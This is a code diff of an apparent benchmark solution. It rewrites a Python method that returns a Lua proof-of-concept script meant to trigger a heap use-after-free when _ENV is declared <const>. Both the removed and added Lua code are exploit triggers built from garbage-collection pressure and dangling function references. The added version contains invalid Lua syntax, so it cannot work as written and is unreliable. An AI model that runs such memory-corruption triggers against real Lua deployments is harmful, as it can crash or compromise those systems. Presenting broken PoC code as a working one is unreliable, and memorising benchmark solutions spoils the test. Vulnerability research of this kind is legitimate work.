@@ -1,68 +1,83 @@
 import os
 import subprocess
 import tempfile
-import hashlib
+import shutil
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # This generates a PoC for Lua's heap use-after-free vulnerability
+        # Create a Lua script that triggers the heap use-after-free
         # when _ENV is declared as <const>
-        
-        poc = '''local _ENV <const> = setmetatable({}, {
-    __gc = function()
-        collectgarbage()
-    end
-})
+        poc = b"""-- Heap Use-After-Free PoC for _ENV <const> bug
 
-function f()
-    local _ENV <const> = {}
-    
-    for i = 1, 100 do
-        local function inner()
-            return _ENV
-        end
+-- Create a function with const _ENV
+local function create_const_env()
+    local _ENV = {}
+    local func = function() <const> _ENV = _ENV
+        return x
     end
-    
-    return function()
-        return _ENV
-    end
+    return func, _ENV
 end
 
+-- Create multiple instances to increase chance of use-after-free
 local funcs = {}
+local envs = {}
+
 for i = 1, 100 do
-    funcs[i] = f()
+    local func, env = create_const_env()
+    funcs[i] = func
+    envs[i] = env
+    -- Set x in the environment
+    env.x = "value_" .. i
 end
 
-collectgarbage()
-collectgarbage()
+-- Force garbage collection to free some environments
+collectgarbage("collect")
 
--- Trigger use-after-free
-for i = 1, 100 do
-    local status, result = pcall(funcs[i])
-end
-
--- Create more memory pressure to increase chance of crash
-local t = {}
-for i = 1, 10000 do
-    t[i] = string.rep("A", 1000)
-end
-
-collectgarbage()
-collectgarbage()
-
--- Final trigger
-for i = 1, 100 do
-    local status, result = pcall(funcs[1])
-    if not status then
-        -- Force crash by accessing potentially freed memory
-        local x = {}
-        setmetatable(x, {__gc = function() return funcs[1]() end})
-        x = nil
-        collectgarbage()
-        break
+-- Try to access freed environments through the functions
+-- This should trigger use-after-free when the bug is present
+local results = {}
+for i = 1, #funcs do
+    -- Use pcall to catch any errors and continue
+    local ok, result = pcall(funcs[i])
+    if ok then
+        results[i] = result
     end
 end
 
-return 1'''
+-- Additional heap manipulation to increase reliability
+for i = 1, #envs do
+    if i % 3 == 0 then
+        envs[i] = nil
+    end
+end
 
-        return poc.encode('utf-8')
+collectgarbage("collect")
+
+-- More attempts to use the functions
+for i = 1, #funcs do
+    if i % 2 == 0 then
+        pcall(funcs[i])
+    end
+end
+
+-- Create dangling references
+local weak_refs = {}
+for i = 1, #funcs do
+    weak_refs[i] = setmetatable({ref = funcs[i]}, {__mode = "v"})
+end
+
+-- Force more GC
+for i = 1, 10 do
+    collectgarbage("collect")
+end
+
+-- Final attempt to trigger the bug
+-- This is where the use-after-free should occur
+local last_func = funcs[#funcs]
+local status, err = pcall(last_func)
+
+-- Return something to avoid early exit
+return "PoC complete"
+"""
+
+        return poc
